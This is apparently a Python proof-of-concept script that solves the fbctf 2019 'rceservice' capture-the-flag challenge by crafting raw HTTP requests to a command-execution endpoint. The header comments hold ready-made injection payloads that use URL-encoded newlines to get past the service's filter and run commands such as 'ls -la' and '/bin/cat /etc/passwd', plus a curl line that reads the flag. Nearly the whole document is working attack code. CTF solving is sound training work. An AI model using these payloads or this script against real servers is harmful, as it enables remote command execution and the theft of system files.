#!/usr/bin/python3

## Example usage:
##     python3 http_req.py -d "?cmd={\"cmd\":\"ls\"}"

## curl 'localhost:8080/?cmd=\{"cmd":"ls"\}'
## cat, ls, route, id
## curl 'http://challenges.fbctf.com:8085/?cmd=\{"cmd":"cat%20flag"\}'

## Solution to fbctf19 rceservice: python3 poc.py -d "?cmd={%0a\"cmd\":\"ls%20-la\"%0a}"
##           python3 poc.py -d "?cmd={%0a\"cmd\":\"%2fbin%2fcat%20%2fetc%2fpasswd\"%0a}"

import argparse
import socket

def main():
    parser = argparse.ArgumentParser()

    parser.add_argument("-t", "--target"
        , help="Specify a target host: Default is localhost"
        , type=str, action="store", default="localhost")

    parser.add_argument("-p", "--port"
        , help="Specify a target port: Default is 8080"
        , type=str, action="store", default="8080")

    parser.add_argument("-d", "--data"
        , help="Specify data to send: Default is ls payload"
        , type=str, action="store", default="?cmd={\"cmd\":\"ls\"}")

    args = parser.parse_args()

    host = bytes(args.target, 'ascii')
    port = bytes(args.port, 'ascii')
    data = bytes(args.data, 'ascii') 

    print("Target = ", host)
    print("Port = ", port)

    http_request = craft_http_req(host, port, b"GET", b"/", data)

    print("[+] Crafted HTTP request: ")
    print("=============================")
    print('\x1b[3;32;40m', end="") 
    print(http_request, end="")
    print('\x1b[0m')
    print("=============================")

    send_tcp_request(host, int(port), http_request)

def craft_http_req(host, port, method, path, data):
    newline = b"\r\n"

    req = b""

    req += method
    req += b" " + path
    if method == b"GET":
        req += data
    req += b" HTTP/1.1"
    req += newline

    req += b"Host: " + host + b":" + port
    req += newline

    req += b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0" 
    req += newline
    
    req += b"Accept: */*"
    req += newline

    if method == b"POST":
        req += data

    req += newline

    return req

def send_tcp_request(host, port, request):
    print("[+] Sending TCP request")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.sendall(request)

    print("[+] Received... ")
    response = s.recv(1024)

    print('\x1b[3;31;40m', end="") 
    print(response, end="")
    print('\x1b[0m')
    
    s.close()

    if b"Success!" in response:
        print('\x1b[6;30;42m' + 'Command executed successfully!' + '\x1b[0m')

if __name__ == "__main__":
    main()
